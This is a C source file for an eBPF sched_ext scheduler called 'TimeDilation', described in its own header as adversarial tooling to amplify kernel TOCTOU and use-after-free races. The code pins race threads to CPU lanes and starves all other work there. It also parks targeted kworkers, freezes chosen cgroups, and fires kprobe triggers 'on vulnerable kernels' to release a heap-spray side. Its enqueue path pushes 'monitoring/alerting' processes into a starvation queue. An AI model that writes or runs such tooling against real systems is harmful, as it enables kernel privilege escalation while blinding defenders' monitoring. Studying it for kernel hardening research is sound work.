/*
 * TimeDilation - adversarial sched_ext tooling for deterministic
 * TOCTOU / UAF race amplification. (See TimeDilation.h for the bolt-on
 * upgrades U1-U4.)
 *
 * Built on the adversarial scheduling research in this repository
 * (scx_starve):
 *
 *  - .select_cpu pins armed race threads to their dedicated per-CPU lanes.
 *  - .enqueue dispatches race threads into the lane with
 *    SCX_SLICE_INF (or a configured finite slice, see td_threads).
 *  - .dispatch on an armed lane consumes only the lane queue: every
 *    other task on the lane CPU starves, so the racing threads run in
 *    hardware lockstep. Per-CPU SLUB locality is preserved by
 *    construction: no other task runs on the lane core.
 *  - While a lane is armed or held (hold_k), kworkers (PF_KTHREAD)
 *    are routed into TD_DSQ_KPARKED and only released onto a lane
 *    when a lane is resumed (release_k).
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "TimeDilation.h"
#include "scx_starve.h"      /* U4: target_pids/config_map + DSQ ids */

char _license[] SEC("license") = "GPL";

#define TD_PF_KTHREAD 0x00200000U   /* include/linux/sched.h */

/* Race threads: pid -> lane + per-thread slice. */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, TD_MAX_THREADS);
    __type(key, __u32);
    __type(value, struct td_thread);
} td_threads SEC(".maps");

/* Per-lane control: armed, kworker hold/release. */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, TD_MAX_CORES);
    __type(key, __u32);
    __type(value, struct td_core);
} td_cores SEC(".maps");

/* Per-CPU statistics. */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct td_stats);
} td_stats_map SEC(".maps");

/* Global flag: any lane armed or held (mirrored by userspace). */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} td_active SEC(".maps");

/* --- U4: scx_starve fusion — same map names/types as scx_starve.bpf.c --- */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_TARGET_PIDS);
    __type(key, __u32);
    __type(value, struct starve_target);
} target_pids SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, struct starve_config);
} config_map SEC(".maps");

/* --- U3: per-task heartbeat for trickle releases --- */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, TD_MAX_THREADS);
    __type(key, __u32);             /* pid of the parked task */
    __type(value, struct td_hb);
} td_kparked_hb SEC(".maps");

/* --- U3: surgical kworker comm filter --- */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, TD_MAX_PARK_TARGETS);
    __type(key, __u32);
    __type(value, struct td_park_target);
} td_park_targets SEC(".maps");

/* --- U4: cgroup-isolation freeze list --- */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, TD_MAX_FROZEN_CGS);
    __type(key, __u64);             /* cgroup id */
    __type(value, __u32);
} td_frozen_cgs SEC(".maps");

static __always_inline struct td_stats *td_stats(void)
{
    __u32 zero = 0;
    return bpf_map_lookup_elem(&td_stats_map, &zero);
}

static __always_inline bool td_any_active(void)
{
    __u32 zero = 0;
    __u32 *flag = bpf_map_lookup_elem(&td_active, &zero);

    return flag && *flag;
}

/* --- U4: starve-slice policy copied from scx_starve.bpf.c --- */
static __always_inline __u64 td_starve_slice(void)
{
    __u32 zero = 0;
    struct starve_config *cfg = bpf_map_lookup_elem(&config_map, &zero);

    if (!cfg)
        return SLICE_DEFAULT_NS;
    if (cfg->custom_slice_ns)
        return cfg->custom_slice_ns;
    switch (cfg->intensity) {
    case STARVE_INTENSITY_MILD:
        return SLICE_STARVE_MILD_NS;
    case STARVE_INTENSITY_MODERATE:
        return SLICE_STARVE_MOD_NS;
    case STARVE_INTENSITY_HEAVY:
    case STARVE_INTENSITY_DENY:
        return SLICE_STARVE_HEAVY_NS;
    default:
        return SLICE_DEFAULT_NS;
    }
}

/* --- U4: current task in a frozen cgroup? --- */
static __always_inline bool td_cg_frozen(void)
{
    __u64 cg = bpf_get_current_cgroup_id();
    __u32 *act = bpf_map_lookup_elem(&td_frozen_cgs, &cg);

    return act && *act;
}

/* --- U3: comm equality, fully unrolled fixed window --- */
static __always_inline bool td_comm_eq(const char *a, const char *b)
{
    /* Straight-line compare over the fixed 16-byte comm window: no
     * loop state for the verifier to merge across iterations. */
    if (a[0] != b[0] || a[1] != b[1] || a[2] != b[2] || a[3] != b[3] ||
        a[4] != b[4] || a[5] != b[5] || a[6] != b[6] || a[7] != b[7] ||
        a[8] != b[8] || a[9] != b[9] || a[10] != b[10] || a[11] != b[11] ||
        a[12] != b[12] || a[13] != b[13] || a[14] != b[14] || a[15] != b[15])
        return false;
    return true;
}

/* --- U3: does slot 0 hold the operator's target comm? ---
 * Single-slot filter: one comm per park window. A fixed slot keeps the
 * lookup key a compile-time constant, so the verifier sees one map
 * value rather than an unbounded keyed scan. */
static __always_inline bool td_kworker_targeted(struct task_struct *p)
{
    char comm[TD_COMM_LEN] = {};
    struct td_park_target *t;
    __u32 zero = 0;

    BPF_CORE_READ_STR_INTO(&comm, p, comm);
    t = bpf_map_lookup_elem(&td_park_targets, &zero);
    return t && t->active && td_comm_eq(comm, t->comm);
}

/* --- U3: trickle-release parked kworkers, 10µs per dispatch ---
 *
 * The cadence is tracked per CPU (map key = cpu).  Every 4s a CPU opens
 * a short release window: each dispatch call then moves one parked task
 * to the local DSQ, so even a busy armed lane drains the parked set in
 * well under a millisecond while still keeping the freeze duty cycle
 * near 0.02%.  A global gate would let one CPU consume the window and
 * leave the other CPU's affinity-pinned kthreads starving past the 5s
 * sched_ext watchdog.
 */
static __always_inline bool td_trickle_release(struct td_stats *st, __u32 cpu)
{
    struct td_hb *hb;
    __u64 now = bpf_ktime_get_ns();

    hb = bpf_map_lookup_elem(&td_kparked_hb, &cpu);
    if (!hb) {
        struct td_hb init = { .next_ns = now + TD_HB_PERIOD_NS };

        bpf_map_update_elem(&td_kparked_hb, &cpu, &init, BPF_NOEXIST);
        return false;
    }
    if (now >= hb->next_ns) {
        hb->next_ns = now + TD_HB_PERIOD_NS;
        hb->window_end_ns = now + TD_HB_WINDOW_NS;
    }
    if (now >= hb->window_end_ns)
        return false;
    if (!scx_bpf_dsq_move_to_local(TD_DSQ_KPARKED) &&
        !scx_bpf_dsq_move_to_local(TD_DSQ_KOTHER(cpu)) &&
        !scx_bpf_dsq_move_to_local(TD_DSQ_FROZEN))
        return false;
    if (st)
        st->nr_kresumed++;
    if (st)
        st->nr_hb_trickles++;
    return true;
}

/*
 * .select_cpu - pin armed race threads to their lanes.
 */
SEC("struct_ops/td_select_cpu")
s32 BPF_PROG(td_select_cpu, struct task_struct *p, s32 prev_cpu, u64 wake_flags)
{
    __u32 pid = BPF_CORE_READ(p, pid);
    struct td_thread *t = bpf_map_lookup_elem(&td_threads, &pid);
    struct td_core *core;
    bool is_idle;

    if (t && t->core < TD_MAX_CORES) {
        core = bpf_map_lookup_elem(&td_cores, &t->core);
        if (core && core->armed)
            return (s32)t->core;
    }
    return scx_bpf_select_cpu_dfl(p, prev_cpu, wake_flags, &is_idle);
}

/*
 * .enqueue - race threads go to their lane; starve targets to
 * DSQ_STARVE; frozen-cgroup tasks to TD_DSQ_FROZEN; kworkers may be
 * parked; everything else goes to the normal queue.
 */
SEC("struct_ops/td_enqueue")
void BPF_PROG(td_enqueue, struct task_struct *p, u64 enq_flags)
{
    __u32 pid = BPF_CORE_READ(p, pid);
    struct td_thread *t = bpf_map_lookup_elem(&td_threads, &pid);
    struct td_core *core;
    struct td_stats *st;
    struct starve_target *st_target;

    /* U4: cgroup isolation — frozen sibling cgroups get only the
     * sub-watchdog 10µs trickle from td_trickle_release(). */
    if (td_cg_frozen()) {
        scx_bpf_dsq_insert(p, TD_DSQ_FROZEN, TD_HB_SLICE_NS, enq_flags);
        st = td_stats();
        if (st)
            st->nr_frozen_enqueued++;
        return;
    }

    /* Lane path (U2): td_enqueue honors the per-thread finite
     * slice_ns override — that is the userfaultfd-replacement
     * counterpart of U1's auto-trigger. */
    if (t && t->core < TD_MAX_CORES &&
        (core = bpf_map_lookup_elem(&td_cores, &t->core)) &&
        core->armed) {
        __u64 slice = t->slice_ns ? t->slice_ns : TD_SLICE_DEFAULT_NS;

        scx_bpf_dsq_insert(p, core->lane_dsq, slice, enq_flags);
        st = td_stats();
        if (st)
            st->nr_race_enqueued++;
        return;
    }

    /* U4: scx_starve fusion — monitoring/alerting targets go to
     * DSQ_STARVE and are not consumed while other work remains. */
    st_target = bpf_map_lookup_elem(&target_pids, &pid);
    if (!st_target) {
        __u32 tgid = BPF_CORE_READ(p, tgid);

        st_target = bpf_map_lookup_elem(&target_pids, &tgid);
    }
    if (st_target && st_target->active) {
        scx_bpf_dsq_insert(p, DSQ_STARVE, td_starve_slice(), enq_flags);
        st = td_stats();
        if (st)
            st->nr_starved_enqueued++;
        return;
    }

    /*
     * U3: only filter-matched kernel threads are frozen into
     * TD_DSQ_KPARKED (heartbeat-only).  Everything else goes to
     * TD_DSQ_KOTHER: it runs normally on unarmed CPUs and in lane-idle
     * gaps on the armed CPU.  Parking *all* kthreads is fatal: the
     * sched_ext watchdog itself is a work item on system_dfl_wq, so a
     * park-all policy misses the 2.5s check-in and ejects at 5s.
     */
    if ((BPF_CORE_READ(p, flags) & TD_PF_KTHREAD) && td_any_active()) {
        __u32 zero = 0;
        struct td_park_target *ft = bpf_map_lookup_elem(&td_park_targets, &zero);

        if (ft && ft->active && td_kworker_targeted(p)) {
            scx_bpf_dsq_insert(p, TD_DSQ_KPARKED, TD_HB_SLICE_NS, enq_flags);
            st = td_stats();
            if (st)
                st->nr_held_kthreads++;
        } else {
            __u32 pcpu = (__u32)scx_bpf_task_cpu(p);

            /* Lanes and per-CPU keepalive queues cover cores
             * 0..TD_MAX_CORES-1.  On larger machines, fall back to the
             * normal queue instead of parking the task on a queue that
             * no CPU will ever dispatch. */
            if (pcpu < TD_MAX_CORES)
                scx_bpf_dsq_insert(p, TD_DSQ_KOTHER(pcpu), TD_HB_SLICE_NS,
                                   enq_flags);
            else
                scx_bpf_dsq_insert(p, TD_DSQ_NORMAL, TD_SLICE_DEFAULT_NS,
                                   enq_flags);
        }
        return;
    }

    scx_bpf_dsq_insert(p, TD_DSQ_NORMAL, TD_SLICE_DEFAULT_NS, enq_flags);
}

/*
 * .dispatch - on an armed lane, only the lane tasks run; on the
 * normal lane, background tasks run normally. U3: trickle-release
 * parked kworkers, one per 4000ms heartbeat.
 */
SEC("struct_ops/td_dispatch")
void BPF_PROG(td_dispatch, s32 cpu, struct task_struct *prev)
{
    struct td_core *core;
    struct td_stats *st;
    __u32 c = (__u32)cpu;

    core = bpf_map_lookup_elem(&td_cores, &c);
    st = td_stats();

    if (core && core->armed) {
        /* Heartbeat first: when the 4s gate opens, parked kworkers get
         * 10µs turns even if the lane is busy, otherwise CPU-0-pinned
         * kernel threads would starve past the 5s watchdog. */
        if (td_trickle_release(st, c))
            return;
        /* Race lane: only lane tasks run; unregistered work starves. */
        if (scx_bpf_dsq_move_to_local(core->lane_dsq)) {
            if (st)
                st->nr_lane_dispatched++;
            return;
        }
        /* U3: unmatched kthreads run in lane-idle gaps (watchdog safe). */
        if (scx_bpf_dsq_move_to_local(TD_DSQ_KOTHER(c)))
            return;
        /* U4: consume starve targets only when the lane is idle. */
        scx_bpf_dsq_move_to_local(TD_DSQ_STARVE);
        return;
    }

    /* Normal lane: background tasks run normally.  Give the heartbeat
     * priority over normal work so parked kworkers cannot be starved
     * behind a busy normal DSQ (that trips the 5s task watchdog). */
    if (td_trickle_release(st, c))
        return;
    if (scx_bpf_dsq_move_to_local(TD_DSQ_NORMAL))
        return;
    /* U3: unmatched kthreads run freely on unarmed CPUs. */
    if (scx_bpf_dsq_move_to_local(TD_DSQ_KOTHER(c)))
        return;
    /* U4: starve targets are lowest priority. */
    scx_bpf_dsq_move_to_local(TD_DSQ_STARVE);
}

SEC("struct_ops/td_running")
void BPF_PROG(td_running, struct task_struct *p)
{
}

SEC("struct_ops/td_stopping")
void BPF_PROG(td_stopping, struct task_struct *p, bool runnable)
{
}

/* ---- U1: nanosecond auto-trigger (kprobes on vulnerable kernels) ---- */
static __always_inline void td_auto_trigger(void)
{
    __u32 pid = (__u32)bpf_get_current_pid_tgid();
    struct td_thread *t = bpf_map_lookup_elem(&td_threads, &pid);
    struct td_core *core;
    struct td_stats *st;

    if (!t || t->core >= TD_MAX_CORES)
        return;
    core = bpf_map_lookup_elem(&td_cores, &t->core);
    if (!core)
        return;
    if (!t->slice_ns)
        t->slice_ns = TD_TRIGGER_SLICE_NS;  /* finite: tick-expiry preemptible */
    core->frozen = 1;                        /* U2: marked frozen */
    core->release_k = 1;                     /* spray side may now leave KPARKED */
    st = td_stats();
    if (st)
        st->nr_auto_triggered++;
}

static int td_trigger_common(void)
{
    td_auto_trigger();
    return 0;
}

/*
 * U1: one kprobe program per entry in TD_TRIGGER_LIST.  The list lives
 * in TimeDilation.h and is shared with the userspace attach table.
 */
#define TD_TRIGGER_PROG(sym)                     \
    SEC("kprobe/" #sym)                          \
    int td_trigger_##sym(void)                   \
    {                                            \
        return td_trigger_common();              \
    }

TD_TRIGGER_LIST(TD_TRIGGER_PROG)

SEC("struct_ops.s/td_init")
s32 BPF_PROG(td_init)
{
    __u32 i, zero = 0, inactive = 0;
    struct td_hb hb0 = { .next_ns = bpf_ktime_get_ns() + TD_HB_PERIOD_NS };
    int err;

    /* Pinned maps survive a reload; never inherit a stale armed flag
     * from a previous run (it would park kthreads with no lane armed). */
    bpf_map_update_elem(&td_active, &zero, &inactive, BPF_ANY);
    bpf_map_update_elem(&td_kparked_hb, &zero, &hb0, BPF_ANY);

    for (i = 0; i < TD_MAX_CORES; i++) {
        err = scx_bpf_create_dsq(TD_DSQ_ID(i), -1);
        if (err) {
            bpf_printk("TimeDilation: failed to create lane %d: %d\n", i, err);
            return err;
        }
    }
    err = scx_bpf_create_dsq(TD_DSQ_NORMAL, -1);
    if (err) {
        bpf_printk("TimeDilation: failed to create TD_DSQ_NORMAL: %d\n", err);
        return err;
    }
    err = scx_bpf_create_dsq(TD_DSQ_KPARKED, -1);
    if (err) {
        bpf_printk("TimeDilation: failed to create TD_DSQ_KPARKED: %d\n", err);
        return err;
    }
    err = scx_bpf_create_dsq(TD_DSQ_FROZEN, -1);
    if (err) {
        bpf_printk("TimeDilation: failed to create TD_DSQ_FROZEN: %d\n", err);
        return err;
    }
    err = scx_bpf_create_dsq(TD_DSQ_STARVE, -1);
    if (err) {
        bpf_printk("TimeDilation: failed to create TD_DSQ_STARVE: %d\n", err);
        return err;
    }
    for (i = 0; i < TD_MAX_CORES; i++) {
        err = scx_bpf_create_dsq(TD_DSQ_KOTHER(i), -1);
        if (err) {
            bpf_printk("TimeDilation: failed to create KOTHER %u: %d\n", i, err);
            return err;
        }
    }
    bpf_printk("TimeDilation: scheduler initialized\n");
    return 0;
}

SEC("struct_ops.s/td_exit")
void BPF_PROG(td_exit, struct scx_exit_info *ei)
{
    bpf_printk("TimeDilation: scheduler detached\n");
}

SEC(".struct_ops.link")
struct sched_ext_ops td_ops = {
    .select_cpu         = (void *)td_select_cpu,
    .enqueue            = (void *)td_enqueue,
    .dispatch           = (void *)td_dispatch,
    .running            = (void *)td_running,
    .stopping           = (void *)td_stopping,
    .init               = (void *)td_init,
    .exit               = (void *)td_exit,
    .name               = "scx_timedil",
    .timeout_ms         = 5000,
};
